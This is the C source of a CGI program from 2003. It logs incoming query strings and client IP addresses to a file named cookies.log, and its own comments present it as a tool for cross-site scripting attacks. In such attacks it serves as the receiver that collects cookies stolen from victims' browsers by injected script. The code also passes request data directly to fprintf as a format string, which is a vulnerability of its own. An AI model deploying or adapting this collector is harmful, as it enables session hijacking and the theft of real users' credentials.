/* 
 *
 *  CGI program to grab the http QUERY_STRING, & REMOTE_ADDR, 
 *  remove the escape chars, and save it to a logfile. 
 *  Usfull in Cross Site Scripting attacks. 
 *
 * - nocon
 * Sun Oct  5 22:52:32 CDT 2003
 *
 *  Compile: 
 *    gcc -Wall getstr.c -o getstr.cgi
 *
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

/* Filename to log requests */
#define FILENAME "/tmp/cookies.log"


/****************************************/
/*   Function removes HTTP escapes.     */
/*    Harry H. Cheng, 11/24/1995        */ 
/*                                      */
/*     - changes '+' to ' '             */
/*     - changes "%xx" back to ASCII    */
/*                                      */
/****************************************/
unsigned char *unescape(unsigned char *url) 
{
int x,y;
char hex[3];

    for(x=0,y=0;url[y];++x,++y) {
        if(url[y] == '+') { url[x] = ' '; }
        
        if(url[y] == '%') {
               hex[0] = url[y+1]; 
               hex[1] = url[y+2]; 
               hex[2] = '\0';
               url[x] = strtol(hex,NULL,16);
               y+=2;
         } else {
               url[x] = url[y];
         }
     } 

    url[x] = '\0';
 return(url);
} 


int main(int argc, char *argv[])
{
FILE *out_file;
unsigned char *qstring;
unsigned char *string;
unsigned char *ipaddr;

      qstring = getenv("QUERY_STRING");
      ipaddr = getenv("REMOTE_ADDR");

         if(qstring == NULL) {
              printf("Content-type: text/plain\n\n");
              printf("No Input!\n");
           return(0);
         } else {

               string = unescape(qstring);  
               printf("Content-type: text/plain\n\n");

	     out_file = fopen(FILENAME,"a");

	         if(out_file == NULL) {
			   printf("Content-type: text/plain\n\n");
			   perror(FILENAME);
			   exit(-1);
		 }
  
		 fprintf(out_file,ipaddr);
		 fprintf(out_file,"\n");
		 fprintf(out_file,string);
		 fprintf(out_file,"\n----------------------------------------------------------------\n\n");

	      fclose(out_file);

	    /* Print back to browser */
	    /*
	     * printf("QUERY_STRING = %s\n",string);
	     */
         }

   fflush(stdout);
 return(0);
}
